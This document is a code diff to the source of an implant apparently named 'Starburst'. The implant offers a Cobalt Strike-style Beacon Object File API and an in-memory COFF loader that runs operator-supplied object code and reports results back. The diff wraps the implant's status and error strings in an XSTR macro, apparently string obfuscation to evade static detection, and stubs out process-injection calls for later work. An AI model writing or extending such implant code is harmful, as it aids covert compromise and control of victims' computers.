@@ -364,7 +364,7 @@ static char* __cdecl declfn beacon_data_ptr( datap* dp, int size ) {
 static BOOL __cdecl declfn beacon_download( const char* filename, const char* buffer, unsigned int length ) {
     auto inst = coff_get_inst();
     if ( !inst || !filename || !buffer || length == 0 ) return FALSE;
-    beacon_printf( 0, "[download] %s (%u bytes received by BOF)\n", filename, length );
+    beacon_printf( 0, XSTR("[download] %s (%u bytes received by BOF)\n"), filename, length );
     return TRUE;
 }
 
@@ -393,21 +393,21 @@ static void __cdecl declfn beacon_inject_process(
     HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len
 ) {
     (void)hProc; (void)pid; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
-    beacon_printf( 0, "[error] BeaconInjectProcess not yet supported\n" );
+    beacon_printf( 0, XSTR("[error] BeaconInjectProcess not yet supported\n") );
 }
 
 static void __cdecl declfn beacon_inject_temp_process(
     PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len
 ) {
     (void)pInfo; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
-    beacon_printf( 0, "[error] BeaconInjectTemporaryProcess not yet supported\n" );
+    beacon_printf( 0, XSTR("[error] BeaconInjectTemporaryProcess not yet supported\n") );
 }
 
 static BOOL __cdecl declfn beacon_spawn_temp_process(
     BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo
 ) {
     (void)x86; (void)ignoreToken; (void)si; (void)pInfo;
-    beacon_printf( 0, "[error] BeaconSpawnTemporaryProcess not yet supported\n" );
+    beacon_printf( 0, XSTR("[error] BeaconSpawnTemporaryProcess not yet supported\n") );
     return FALSE;
 }
 
@@ -529,7 +529,7 @@ static BOOL __cdecl declfn beacon_remove_value( const char* key ) {
     return FALSE;
 }
 
-// ── Data Store (stubs — Starburst doesn't have a data store yet) ──
+// ── Data Store (stubs - Starburst doesn't have a data store yet) ──
 
 static bof_data_store_object* __cdecl declfn beacon_data_store_get_item( size_t ) {
     return nullptr;
@@ -1006,7 +1006,7 @@ auto declfn starburst::cmd_execute_coff(
 
     if ( !coff_data || coff_len < sizeof(COFF_FILE_HEADER) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no COFF data" ) ) );
+            XSTR( "no COFF data" ) );
         return;
     }
 
@@ -1032,7 +1032,7 @@ auto declfn starburst::cmd_execute_coff(
         inst.heap_alloc( header->NumberOfSections * sizeof(uint8_t*) ) );
     if ( !section_ptrs ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -1071,7 +1071,7 @@ auto declfn starburst::cmd_execute_coff(
     if ( !coff_base ) {
         inst.heap_free( section_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
+            XSTR( "section alloc failed" ) );
         return;
     }
 
@@ -1095,7 +1095,7 @@ auto declfn starburst::cmd_execute_coff(
         inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     memory::zero( func_ptrs, header->NumberOfSymbols * sizeof(void*) );
@@ -1156,7 +1156,7 @@ auto declfn starburst::cmd_execute_coff(
         inst.heap_free( section_ptrs );
         inst.heap_free( func_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
+            XSTR( "entry point not found" ) );
         return;
     }
 
@@ -1299,7 +1299,7 @@ auto declfn starburst::cmd_execute_coff(
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
     } else if ( bof_ok ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
+            XSTR( "executed (no output)" ) );
     } else if ( inst.coff.crash_code ) {
         char err[32] = { 'B','O','F',' ','c','r','a','s','h',':',' ','0','x' };
         uint32_t code = inst.coff.crash_code;
@@ -1311,7 +1311,7 @@ auto declfn starburst::cmd_execute_coff(
         queue_response( inst, task_uuid, RESPONSE_ERROR, err );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "BOF timed out" ) ) );
+            XSTR( "BOF timed out" ) );
     }
 
     if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
